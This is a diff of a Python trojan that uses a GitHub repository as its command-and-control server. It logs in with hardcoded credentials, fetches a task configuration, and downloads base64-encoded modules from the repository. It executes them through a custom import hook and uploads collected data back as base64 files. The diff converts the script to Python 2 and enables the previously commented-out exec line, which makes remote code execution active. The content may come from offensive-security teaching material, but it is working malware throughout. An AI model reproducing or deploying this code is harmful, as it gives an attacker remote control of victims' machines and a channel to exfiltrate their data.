@@ -6,23 +6,26 @@ import time
 import imp
 import random
 import threading
-import queue
+import Queue
 import os
 
 from github3 import login
 
 trojan_id = "abc"
 
-trojan_config = f"{trojan_id}.json"
-data_path = f"data/{trojan_id}/"
+trojan_config = "%s.json" % trojan_id
+data_path = "data/%s/" % trojan_id
 trojan_modules = []
 configured = False
-task_queue = queue.Queue()
+task_queue = Queue.Queue()
 
+USERNAME = "username"
+PASSWORD = "password"
+REPO = "virus"
 
 def connect_to_github():
-    gh = login(username="user", password="pass")
-    repo = gh.repository("user", "repo")
+    gh = login(username=USERNAME, password=PASSWORD)
+    repo = gh.repository(USERNAME, REPO)
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -34,7 +37,7 @@ def get_file_contents(filepath):
 
     for filename in tree.tree:
         if filepath in filename.path:
-            print(f"[*] Found file {filepath}")
+            print("[*] Found file %s" % filepath)
             blob = repo.blob(filename._json_data['sha'])
             return blob.content
     return None
@@ -47,13 +50,13 @@ def get_trojan_config():
 
     for task in config:
         if task['module'] not in sys.modules:
-            exec(f"import {task['module']}")
+            exec("import %s" % task['module'])
 
     return config
 
 def store_module_result(data):
     gh, repo, branch = connect_to_github()
-    remote_path = f"data/{trojan_id}/{random.randint(1000, 10000)}.data"
+    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000, 10000))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
 
 class GitImporter():
@@ -62,8 +65,8 @@ class GitImporter():
 
     def find_module(self, fullname, path=None):
         if configured:
-            print(f"[*] Attempting to retrieve {fullname}")
-            new_library = get_file_contents(f"modules/{fullname}")
+            print("[*] Attempting to retrieve %s" % fullname)
+            new_library = get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
@@ -72,7 +75,7 @@ class GitImporter():
 
     def load_module(self, name):
         module = imp.new_module(name)
-        # exec self.current_module_code in module.__dict__
+        exec self.current_module_code in module.__dict__
         sys.modules[name] = module
 
         return module
